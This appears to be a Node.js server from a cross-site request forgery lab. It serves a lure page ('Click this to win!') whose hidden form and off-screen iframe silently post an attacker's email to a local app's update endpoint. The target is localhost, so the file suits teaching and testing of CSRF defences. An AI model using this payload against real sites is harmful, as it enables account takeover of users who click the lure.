const http = require("http");

const HOSTNAME = process.env.HOSTNAME || "0.0.0.0";
const PORT = process.env.PORT || 3001;

const attackerEmail = "attacker@example.com";

const server = http.createServer((req, res) => {
  res.writeHead(200, {
    "Content-Type": "text/html",
  });
  res.end(`
        <iframe name=hide style="position:absolute;left:-1000px"></iframe>

        <form method="post" action="http://localhost:3000/update" target="hide">
            <input type="hidden" name="email" value="${attackerEmail}">
            <input type="submit" value="Click this to win!">
        </form>`);
});

server.listen(PORT, HOSTNAME, () => {
  console.log(`Collection Server listening on port ${PORT}`);
});
